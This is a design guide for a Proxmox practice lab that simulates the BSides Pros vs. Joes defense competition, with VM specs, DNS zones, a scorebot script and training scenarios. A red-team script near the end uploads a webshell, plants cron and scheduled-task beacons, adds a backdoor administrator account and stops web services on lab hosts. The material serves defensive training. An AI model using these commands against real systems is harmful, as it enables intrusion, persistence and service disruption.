# 🏗️ PvJ Practice Lab - Proxmox Design

*Comprehensive lab environment that mirrors BSides Pros vs. Joes competition*

## 🎯 Lab Overview

### Design Goals
- **Realistic PvJ simulation** - Mirror actual competition environment
- **Team training** - Practice for Windows, *nix, Firewall, and BIND teams
- **Scoring simulation** - Automated health checks every 3 minutes
- **Attack simulation** - Red team activities and persistence
- **Scalable complexity** - Start simple, add machines over time

### Resource Requirements
- **Proxmox host**: 64GB RAM minimum, 128GB recommended
- **Storage**: 2TB SSD minimum for performance
- **Network**: Dedicated lab network segment
- **Internet**: Required for updates and external DNS simulation

---

## 🌐 Network Topology

### Network Segments
```
┌─────────────────────────────────────────────────────────────┐
│                    PROXMOX HOST                             │
│  ┌─────────────────────────────────────────────────────────┤
│  │                 Management Network                      │
│  │                   192.168.100.0/24                     │
│  └─────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────────────┤
│  │                  Team Network                           │
│  │                   10.1.1.0/24                          │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐              │
│  │  │ pfSense  │  │   DNS    │  │ Scorebot │              │
│  │  │Firewall  │  │ Server   │  │ System   │              │
│  │  │.1        │  │ .10      │  │ .5       │              │
│  │  └──────────┘  └──────────┘  └──────────┘              │
│  │                                                         │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐              │
│  │  │Windows   │  │ Linux    │  │ Linux    │              │
│  │  │DC/Web    │  │Web/Mail  │  │Database  │              │
│  │  │.20       │  │.30       │  │.40       │              │
│  │  └──────────┘  └──────────┘  └──────────┘              │
│  │                                                         │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐              │
│  │  │Windows   │  │ Linux    │  │ Red Team │              │
│  │  │File/Mail │  │File/SSH  │  │ Attack   │              │
│  │  │.50       │  │.60       │  │ Box .100 │              │
│  │  └──────────┘  └──────────┘  └──────────┘              │
│  └─────────────────────────────────────────────────────────┤
└─────────────────────────────────────────────────────────────┘
```

### VLAN Configuration
- **VLAN 100**: Management (192.168.100.0/24)
- **VLAN 101**: Team Network (10.1.1.0/24)
- **VLAN 102**: Scoring Network (10.1.2.0/24)
- **VLAN 103**: Attack Network (10.1.3.0/24)

---

## 🖥️ Virtual Machine Specifications

### Core Infrastructure VMs

#### 1. pfSense Firewall (10.1.1.1)
```yaml
VM Specs:
  CPU: 2 cores
  RAM: 2GB
  Disk: 20GB
  NICs: 3 (Management, Team, External)

Configuration:
  - WAN: External internet access
  - LAN: Team network (10.1.1.0/24)
  - DMZ: Scoring network (10.1.2.0/24)
  - Web interface: https://10.1.1.1
  - Default rules: Allow all (for scoring)
  - Logging: All traffic logged
```

#### 2. BIND DNS Server (10.1.1.10)
```yaml
VM Specs:
  CPU: 2 cores
  RAM: 2GB
  Disk: 20GB
  OS: Ubuntu 22.04 LTS

Services:
  - BIND9 DNS (Port 53)
  - SSH (Port 22)
  - SNMP monitoring (Port 161)

DNS Zones:
  - lab.local (forward zone)
  - 1.1.10.in-addr.arpa (reverse zone)
  - External forwarders: 8.8.8.8, 1.1.1.1

Critical: ALL scoring depends on this server
```

#### 3. Scorebot System (10.1.1.5)
```yaml
VM Specs:
  CPU: 4 cores
  RAM: 4GB
  Disk: 40GB
  OS: Ubuntu 22.04 LTS

Services:
  - Custom scorebot application
  - Web dashboard (Port 8080)
  - Database (SQLite/PostgreSQL)
  - SSH management (Port 22)

Function:
  - Check services every 3 minutes
  - Display team scoreboard
  - Log service availability
  - Generate reports
```

### Windows Team VMs

#### 4. Windows Domain Controller (10.1.1.20)
```yaml
VM Specs:
  CPU: 4 cores
  RAM: 6GB
  Disk: 60GB
  OS: Windows Server 2019/2022

Services:
  - Active Directory (389, 636)
  - DNS (53) - Secondary
  - Kerberos (88)
  - LDAP (389)
  - IIS Web Server (80, 443)
  - RDP (3389)

Scored Services:
  - HTTP (80): Default IIS page
  - HTTPS (443): SSL certificate
  - LDAP (389): Domain authentication
  - DNS (53): AD-integrated zones
```

#### 5. Windows File/Mail Server (10.1.1.50)
```yaml
VM Specs:
  CPU: 4 cores
  RAM: 6GB
  Disk: 80GB
  OS: Windows Server 2019/2022

Services:
  - SMB/CIFS File Sharing (445)
  - Exchange Server or hMailServer (25, 110, 143)
  - SQL Server Express (1433)
  - IIS Web Server (80, 443)
  - RDP (3389)

Scored Services:
  - SMB (445): File shares
  - SMTP (25): Mail sending
  - POP3 (110): Mail retrieval
  - HTTP (80): Web interface
  - SQL (1433): Database connectivity
```

### Linux Team VMs

#### 6. Linux Web/Mail Server (10.1.1.30)
```yaml
VM Specs:
  CPU: 4 cores
  RAM: 4GB
  Disk: 40GB
  OS: Ubuntu 22.04 LTS

Services:
  - Apache2 (80, 443)
  - Postfix SMTP (25)
  - Dovecot IMAP/POP3 (143, 993, 110, 995)
  - SSH (22)
  - MySQL (3306)

Scored Services:
  - HTTP (80): Apache default page
  - HTTPS (443): SSL certificate
  - SMTP (25): Mail relay
  - IMAP (143): Mail access
  - SSH (22): Remote access
  - MySQL (3306): Database
```

#### 7. Linux Database Server (10.1.1.40)
```yaml
VM Specs:
  CPU: 4 cores
  RAM: 6GB
  Disk: 60GB
  OS: Ubuntu 22.04 LTS

Services:
  - PostgreSQL (5432)
  - MySQL/MariaDB (3306)
  - MongoDB (27017)
  - Redis (6379)
  - SSH (22)
  - Nginx (80, 443)

Scored Services:
  - PostgreSQL (5432): Database connectivity
  - MySQL (3306): Database connectivity
  - HTTP (80): Database web interface
  - SSH (22): Remote access
```

#### 8. Linux File/SSH Server (10.1.1.60)
```yaml
VM Specs:
  CPU: 2 cores
  RAM: 4GB
  Disk: 60GB
  OS: Ubuntu 22.04 LTS

Services:
  - SSH (22)
  - FTP (21)
  - SFTP (22)
  - NFS (2049)
  - Samba (139, 445)
  - Nginx (80)

Scored Services:
  - SSH (22): Remote access
  - FTP (21): File transfer
  - NFS (2049): Network file system
  - SMB (445): Windows file sharing
  - HTTP (80): File browser interface
```

### Attack Simulation VM

#### 9. Red Team Attack Box (10.1.1.100)
```yaml
VM Specs:
  CPU: 4 cores
  RAM: 8GB
  Disk: 80GB
  OS: Kali Linux 2024

Purpose:
  - Simulate red team attacks
  - Plant persistence mechanisms
  - Generate beacons
  - Test team defenses

Tools Installed:
  - Metasploit Framework
  - Nmap/Masscan
  - Burp Suite
  - Custom beacon scripts
  - Persistence tools
```

---

## 🔧 Service Configuration Details

### DNS Configuration (BIND9)
```bash
# /etc/bind/named.conf.local
zone "lab.local" {
    type master;
    file "/etc/bind/db.lab.local";
};

zone "1.1.10.in-addr.arpa" {
    type master;
    file "/etc/bind/db.10.1.1";
};

# /etc/bind/db.lab.local
$TTL    604800
@       IN      SOA     dns.lab.local. admin.lab.local. (
                              2         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL

@       IN      NS      dns.lab.local.
dns     IN      A       10.1.1.10
firewall IN     A       10.1.1.1
scorebot IN     A       10.1.1.5
dc      IN      A       10.1.1.20
web1    IN      A       10.1.1.30
db1     IN      A       10.1.1.40
mail1   IN      A       10.1.1.50
file1   IN      A       10.1.1.60
```

### Scorebot Application
```python
#!/usr/bin/env python3
# Simple scorebot simulation
import time
import socket
import requests
import subprocess
from datetime import datetime

SERVICES = {
    '10.1.1.10': [53],  # DNS
    '10.1.1.20': [80, 443, 389, 3389],  # Windows DC
    '10.1.1.30': [22, 80, 443, 25, 143, 3306],  # Linux Web
    '10.1.1.40': [22, 80, 5432, 3306],  # Linux DB
    '10.1.1.50': [80, 445, 25, 110, 1433, 3389],  # Windows File
    '10.1.1.60': [22, 21, 80, 2049, 445],  # Linux File
}

def check_service(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

def check_dns():
    try:
        result = subprocess.run(['nslookup', 'dc.lab.local', '10.1.1.10'], 
                              capture_output=True, timeout=5)
        return result.returncode == 0
    except:
        return False

def main():
    while True:
        print(f"\n=== Scorebot Check - {datetime.now()} ===")
        
        # Check DNS first - critical dependency
        dns_status = check_dns()
        print(f"DNS Resolution: {'UP' if dns_status else 'DOWN'}")
        
        if not dns_status:
            print("⚠️  DNS FAILURE - All services will show DOWN")
        
        # Check all services
        for host, ports in SERVICES.items():
            print(f"\nHost {host}:")
            for port in ports:
                if dns_status:  # Only check if DNS is working
                    status = check_service(host, port)
                    print(f"  Port {port}: {'UP' if status else 'DOWN'}")
                else:
                    print(f"  Port {port}: DOWN (DNS failure)")
        
        time.sleep(180)  # 3 minutes

if __name__ == "__main__":
    main()
```

---

## 🚀 Deployment Instructions

### Phase 1: Infrastructure Setup
```bash
# 1. Create VMs in Proxmox
# Use the VM specifications above
# Configure network bridges for VLANs

# 2. Install pfSense
# Download pfSense ISO
# Configure interfaces and basic rules
# Enable logging and monitoring

# 3. Install DNS Server
# Ubuntu 22.04 base installation
# Install and configure BIND9
# Set up forward and reverse zones

# 4. Install Scorebot System
# Ubuntu 22.04 base installation
# Install Python dependencies
# Deploy scorebot application
# Configure web dashboard
```

### Phase 2: Service Deployment
```bash
# 5. Windows Domain Controller
# Install Windows Server 2019/2022
# Promote to domain controller
# Install IIS and configure basic site
# Join to lab.local domain

# 6. Windows File/Mail Server
# Install Windows Server 2019/2022
# Join to domain
# Install hMailServer or Exchange
# Configure file shares and SQL Express

# 7. Linux Web/Mail Server
# Install Ubuntu 22.04
# Configure Apache, Postfix, Dovecot
# Install MySQL and create test databases
# Configure SSL certificates

# 8. Linux Database Server
# Install Ubuntu 22.04
# Install PostgreSQL, MySQL, MongoDB
# Configure databases and users
# Install web interfaces (phpMyAdmin, etc.)

# 9. Linux File Server
# Install Ubuntu 22.04
# Configure SSH, FTP, NFS, Samba
# Create file shares and test accounts
# Install file browser web interface
```

### Phase 3: Attack Simulation
```bash
# 10. Red Team Attack Box
# Install Kali Linux 2024
# Install additional tools
# Create attack scripts
# Configure beacon generation

# 11. Persistence Mechanisms
# Create scheduled tasks (Windows)
# Create cron jobs (Linux)
# Install backdoors and webshells
# Configure callback mechanisms
```

---

## 🎮 Training Scenarios

### Scenario 1: Basic Service Maintenance
**Duration**: 2 hours
**Objective**: Keep all services green on scoreboard

**Tasks**:
- Monitor scorebot dashboard
- Identify and fix service failures
- Practice team communication
- Document changes made

**Simulated Issues**:
- Apache service stopped
- DNS server unresponsive
- Windows service disabled
- Database connection failure

### Scenario 2: DNS Cascade Failure
**Duration**: 1 hour
**Objective**: Understand DNS dependency

**Tasks**:
- BIND team: Fix DNS server issues
- Other teams: Observe cascade effect
- Practice DNS troubleshooting
- Implement DNS monitoring

**Simulated Issues**:
- DNS service stopped
- Zone file corruption
- Forwarder configuration error
- Network connectivity issues

### Scenario 3: Red Team Attack Simulation
**Duration**: 4 hours
**Objective**: Defend against active attacks

**Tasks**:
- Detect and remove persistence
- Identify beacon traffic
- Restore compromised services
- Coordinate incident response

**Attack Scenarios**:
- Web shell deployment
- Scheduled task persistence
- User account creation
- Service configuration changes
- Network beacon generation

### Scenario 4: Firewall Management
**Duration**: 2 hours
**Objective**: Monitor without blocking

**Tasks**:
- Configure traffic monitoring
- Analyze connection patterns
- Identify suspicious traffic
- Support other teams with network data

**Focus Areas**:
- Traffic flow analysis
- Log correlation
- Performance monitoring
- Security alerting

---

## 📊 Scoring Simulation

### Scorebot Dashboard Features
```html
<!DOCTYPE html>
<html>
<head>
    <title>PvJ Practice Lab Scoreboard</title>
    <meta http-equiv="refresh" content="180">
</head>
<body>
    <h1>Team Scoreboard</h1>
    <table border="1">
        <tr>
            <th>Host</th>
            <th>Service</th>
            <th>Port</th>
            <th>Status</th>
            <th>Uptime %</th>
            <th>Last Check</th>
        </tr>
        <!-- Dynamic content populated by scorebot -->
    </table>
    
    <h2>Team Statistics</h2>
    <p>Total Services: <span id="total">0</span></p>
    <p>Services Up: <span id="up">0</span></p>
    <p>Services Down: <span id="down">0</span></p>
    <p>Overall Uptime: <span id="uptime">0%</span></p>
</body>
</html>
```

### Scoring Metrics
- **Service Availability**: Percentage uptime per service
- **Response Time**: Average response time per service
- **Total Score**: Weighted sum of all services
- **Trend Analysis**: Performance over time
- **Incident Count**: Number of service failures

---

## 🔧 Advanced Features

### Automated Attack Scripts
```bash
#!/bin/bash
# Red team automation script

# Web shell deployment
curl -X POST http://10.1.1.30/upload.php -F "file=@webshell.php"

# Persistence via cron
echo "*/5 * * * * /tmp/beacon.sh" | ssh user@10.1.1.30 "crontab -"

# Windows scheduled task
schtasks /create /tn "UpdateTask" /tr "C:\temp\beacon.exe" /sc minute /mo 5

# User account creation
net user redteam P@ssw0rd /add
net localgroup administrators redteam /add

# Service disruption
systemctl stop apache2
sc stop "World Wide Web Publishing Service"
```

### Monitoring Integration
```yaml
# Prometheus configuration for advanced monitoring
global:
  scrape_interval: 30s

scrape_configs:
  - job_name: 'scorebot'
    static_configs:
      - targets: ['10.1.1.5:9090']
  
  - job_name: 'windows'
    static_configs:
      - targets: ['10.1.1.20:9182', '10.1.1.50:9182']
  
  - job_name: 'linux'
    static_configs:
      - targets: ['10.1.1.30:9100', '10.1.1.40:9100', '10.1.1.60:9100']
```

---

## 🎯 Training Progression

### Week 1: Basic Setup
- Deploy core infrastructure
- Configure basic services
- Test scorebot functionality
- Practice team roles

### Week 2: Service Management
- Run basic maintenance scenarios
- Practice troubleshooting
- Implement monitoring
- Document procedures

### Week 3: Attack Defense
- Deploy red team tools
- Run attack scenarios
- Practice incident response
- Improve coordination

### Week 4: Competition Simulation
- Full-scale practice runs
- Timed scenarios
- Stress testing
- Final preparations

---

## 📚 Additional Resources

### Required Software
- **Proxmox VE**: Latest stable version
- **pfSense**: Community Edition
- **Windows Server**: 2019 or 2022 (evaluation)
- **Ubuntu**: 22.04 LTS
- **Kali Linux**: 2024.x

### Useful Tools
- **Ansible**: Automated deployment
- **Terraform**: Infrastructure as code
- **Grafana**: Advanced monitoring dashboards
- **ELK Stack**: Centralized logging
- **Wireshark**: Network analysis

### Documentation
- Team playbooks and procedures
- Service configuration guides
- Troubleshooting checklists
- Incident response templates

This lab provides a realistic PvJ training environment that will prepare your team for the actual competition while allowing safe experimentation and skill development.

